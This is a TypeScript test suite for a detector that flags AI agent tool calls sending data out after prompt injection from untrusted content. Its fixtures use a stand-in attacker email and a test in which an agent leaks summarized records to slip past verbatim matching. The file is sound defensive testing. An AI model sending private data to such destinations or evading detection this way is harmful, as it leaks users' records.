/**
 * Tests for Injection-Correlated Outbound Detector.
 */

import { describe, it, expect } from 'vitest';
import { detectInjectionCorrelatedOutbound } from '../../src/classifiers/outbound-correlator.js';
import { createSession } from '../../src/engine/session.js';
import type { ToolCallContext } from '../../src/types/context.js';

const OUTBOUND_TOOLS = ['sendOutboundReport', 'sendEmail'];

function makeCtx(overrides: Partial<ToolCallContext> = {}): ToolCallContext {
  return {
    turnId: 'turn-002',
    sessionId: 'session-test',
    toolName: 'sendOutboundReport',
    toolArguments: { recipient: 'attacker@evil-domain.com', body: 'Customer summary report' },
    toolResult: 'sent',
    timestamp: Date.now(),
    ...overrides,
  };
}

function makeSessionWithContext(opts: {
  untrustedSources?: string[];
  trustedSourcesAccessed?: string[];
}): ReturnType<typeof createSession> {
  const session = createSession();
  for (const src of opts.untrustedSources ?? []) {
    session.untrustedSources.add(src);
  }
  for (const src of opts.trustedSourcesAccessed ?? []) {
    session.trustedSourcesAccessed.add(src);
  }
  return session;
}

describe('detectInjectionCorrelatedOutbound', () => {
  describe('fires when all gates pass', () => {
    it('should emit signal when injection context + trusted data + non-authorized outbound', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const result = detectInjectionCorrelatedOutbound(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.signal).toBe('INJECTION_CORRELATED_OUTBOUND');
      expect(result?.layer).toBe('L3');
    });

    it('should capture the destination in the signal', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const result = detectInjectionCorrelatedOutbound(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result?.destination).toBe('attacker@evil-domain.com');
    });

    it('should list untrusted sources and trusted sources in the signal', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent', 'scrapeUrl'],
        trustedSourcesAccessed: ['readPrivateData', 'getCustomerDb'],
      });
      const result = detectInjectionCorrelatedOutbound(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result?.untrustedSources).toContain('fetchExternalContent');
      expect(result?.untrustedSources).toContain('scrapeUrl');
      expect(result?.trustedSourcesAccessed).toContain('readPrivateData');
    });

    it('should fire even when PII is not verbatim in outbound args (summarized exfiltration)', () => {
      // The body has no PII tokens — agent summarized. L3 verbatim match would miss this.
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      session.privilegedValues.add('123-45-6789'); // SSN from L1, not in args
      const ctx = makeCtx({
        toolArguments: {
          recipient: 'attacker@evil-domain.com',
          body: 'Per compliance directive, all records have been forwarded.',
        },
      });
      const result = detectInjectionCorrelatedOutbound(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.signal).toBe('INJECTION_CORRELATED_OUTBOUND');
    });
  });

  describe('does not fire when any gate fails', () => {
    it('should return null for non-outbound tools', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const ctx = makeCtx({ toolName: 'readDatabase' }); // not in OUTBOUND_TOOLS
      const result = detectInjectionCorrelatedOutbound(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when no untrusted sources in session (clean run)', () => {
      const session = makeSessionWithContext({
        untrustedSources: [], // no injection vector
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const result = detectInjectionCorrelatedOutbound(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when no trusted sources accessed (no privileged data)', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: [], // no privileged data accessed
      });
      const result = detectInjectionCorrelatedOutbound(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when destination is in authorizedDestinations', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const ctx = makeCtx({
        toolArguments: { recipient: 'internal-reports@acme.com', body: 'Q4 summary' },
      });
      const result = detectInjectionCorrelatedOutbound(ctx, session, OUTBOUND_TOOLS, ['acme.com']);
      expect(result).toBeNull();
    });

    it('should return null when destination is subdomain of authorized domain', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const ctx = makeCtx({
        toolArguments: { recipient: 'reports@reporting.acme.com', body: 'Q4 summary' },
      });
      const result = detectInjectionCorrelatedOutbound(ctx, session, OUTBOUND_TOOLS, ['acme.com']);
      expect(result).toBeNull();
    });

    it('should return null for empty outbound tools list', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const result = detectInjectionCorrelatedOutbound(makeCtx(), session, []); // no outbound tools
      expect(result).toBeNull();
    });
  });

  describe('zero FP on clean operational patterns', () => {
    it('should not fire on data-exfil-only (no injection vector)', () => {
      // Agent reads PII and sends it out — concerning but no injection context
      const session = makeSessionWithContext({
        untrustedSources: [], // no external content fetched
        trustedSourcesAccessed: ['readPrivateData'],
      });
      session.privilegedValues.add('123-45-6789');
      const result = detectInjectionCorrelatedOutbound(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull(); // L3 EXFILTRATION_RISK handles this, not this signal
    });

    it('should not fire on injection-only (no outbound tool call)', () => {
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const ctx = makeCtx({ toolName: 'fetchExternalContent' }); // not an outbound tool
      const result = detectInjectionCorrelatedOutbound(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should not fire when destination is authorized despite injection context', () => {
      // This is the "model resisted injection" case — blocked destination check prevents FP
      const session = makeSessionWithContext({
        untrustedSources: ['fetchExternalContent'],
        trustedSourcesAccessed: ['readPrivateData'],
      });
      const ctx = makeCtx({
        toolArguments: { recipient: 'manager@acme.com', body: 'Q4 summary report' },
      });
      const result = detectInjectionCorrelatedOutbound(ctx, session, OUTBOUND_TOOLS, ['acme.com']);
      expect(result).toBeNull();
    });
  });
});
